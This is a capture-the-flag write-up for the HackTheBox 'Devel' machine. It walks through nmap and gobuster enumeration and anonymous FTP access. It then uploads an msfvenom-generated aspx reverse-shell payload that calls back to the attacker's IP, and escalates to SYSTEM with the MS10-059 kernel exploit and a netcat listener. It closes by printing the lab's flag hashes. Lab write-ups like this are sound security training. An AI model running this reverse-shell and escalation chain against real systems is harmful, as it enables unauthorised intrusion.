---
title: HackTheBox - Devel
date: 2022-12-10 22:00:00 +0530
categories: [HackTheBox]
tags: [hackthebox, Easy]
---

-------

Starting the Machine and adding the IP to `/etc/hosts` with hostname as `devel.htb`

## Enumeration

### Namp

```console
$ sudo nmap -Pn devel.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-06 00:47 EST
Nmap scan report for devel.htb (10.10.10.5)
Host is up (0.043s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

$ sudo nmap -sC -sV -Pn -p21,80 devel.htb  
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-06 00:49 EST
Nmap scan report for devel.htb (10.10.10.5)
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 12-06-22  05:31AM                 1442 cmdasp.aspx
| 03-17-17  04:37PM                  689 iisstart.htm
| 12-06-22  06:32AM                 2753 shell.aspx
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
```


From Nmap scans
1. Port 21 and 80 are open.
2. Port 21 is being used for **Microsoft ftpd**. _Anonymous_ FTP login is allowed. There are some files present in the share.
3. Port 80, is running **Microsoft IIS httpd 7.5** 

### Gobuster

```console
$ gobuster dir -u http://devel.htb -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devel.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/06 01:13:33 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 154] [--> http://devel.htb/aspnet_client/]                                                                                   
Progress: 4592 / 4615 (99.50%)===============================================================
2022/12/06 01:13:54 Finished
===============================================================
```

We get a **403- Forbidden** when we try to browse to http://devel.htb/aspnet_client/

### FTP
```console
$ ftp anonymous@devel.htb
Connected to devel.htb.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.

$ ftp> dir
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.

$ ftp> mget *  # fetches all the files
```

These files are starting point for deploying MS webserver. 

Since we can browse to devel.htb/iisstart.htm (this htm file is in ftp share), lets try to create aspx page with our payload to get a reverse shell and place it in ftp.

```console
# generate payload
$ msfvenom -p windows/shell_reverse_tcp LHOST="10.10.14.18" LPORT=4242 -f aspx > shell_reverse_tcp.aspx

# connect to FTP and place the payload
$ ftp anonymous@devel.htb
$ ftp> mput shell_reverse_tcp.aspx
```

Now browse to http://devel.htb/reverse_shell_tcp.aspx to get a reverse shell on port 4242.


## Privilege Escalation

As you have put the payload in FTP, we can also put winpeas.bat file in FTP to execute it.

> Trying to run **winpeas.exe** in DOS mode does not work. hence we have used bat file here.

The uploaded files are available in `c:\inetpub\wwwroot`

After running winPEAS.bat, we can see that `SeImpersonatePrivilege` privilege is **Enabled**. Let's not use this to escalate. lets check for kernel exploits. For this,I moved to using `windows-exploit-suggester`. Usage instructions can be found here : https://github.com/Pwnistry/Windows-Exploit-Suggester-python3

After Running Windows-exploit-suggester, the output implies, the machine is vulnerable to many vulnerabilities. going through lowest to highest, we can try each exploit on the machine one by one. The exploit that actually worked is `MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important`.

Here is the executable for exploiting : https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe

Using FTP, place the executable in the machine using binary mode. If not, the exploit will not work.

```console
$ ftp> binary
200 Type set to I.
$ ftp> put chimichurri.exe
```

Now, open another netcat listener to catch the shell this exploit gives us.

`nc -lnvp 1234`

Exploit now on devel's low priv shell.

`MS10-059.exe kali-ip 1234`

![devel](/assets/img/htb_devel/devel.png)

we are now **System** ! we can get both the flags now.

```console
$ c:\Users\babis\Desktop>type user.txt
type user.txt
4835b2a692f3a01c2e1801d633c33b55

$ c:\Users\Administrator\Desktop>type root.txt
type root.txt
6c2cfd162cdf7cc3025c1b55d90bb79e
```